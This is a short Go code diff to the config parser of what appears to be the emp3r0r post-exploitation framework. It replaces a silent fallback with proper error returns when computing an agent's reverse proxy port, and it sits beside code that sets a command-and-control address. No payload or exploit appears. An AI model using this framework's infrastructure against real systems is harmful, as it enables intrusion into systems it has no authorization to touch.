@@ -3,7 +3,6 @@ package emp3r0r_def
 import (
 	"encoding/json"
 	"fmt"
-	"log"
 	"strconv"
 )
 
@@ -14,18 +13,20 @@ func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
 	if err != nil {
 		return fmt.Errorf("failed to parse JSON config: %v", err)
 	}
-	calculateReverseProxyPort := func() string {
+	calculateReverseProxyPort := func() (string, error) {
 		p, err := strconv.Atoi(config_to_write.AgentSocksServerPort)
 		if err != nil {
-			log.Printf("WTF? Emp3r0rProxyPort %s: %v. Invalid JSON config, perhaps start over with a new config file?", config_to_write.AgentSocksServerPort, err)
-			return "22222"
+			return "", fmt.Errorf("WTF? AgentSocksServerPort: %s: %v. Invalid JSON config, perhaps start over with a new config file?", config_to_write.AgentSocksServerPort, err)
 		}
 
 		// reverseProxyPort
 		rProxyPortInt := p + 1
-		return strconv.Itoa(rProxyPortInt)
+		return strconv.Itoa(rProxyPortInt), nil
 	}
-	config_to_write.ReverseProxyPort = calculateReverseProxyPort()
+	config_to_write.ReverseProxyPort, err = calculateReverseProxyPort()
+	if err != nil {
+		return err
+	}
 
 	// these variables are decided by other variables
 	CCAddress = fmt.Sprintf("https://%s", config_to_write.CCHost)
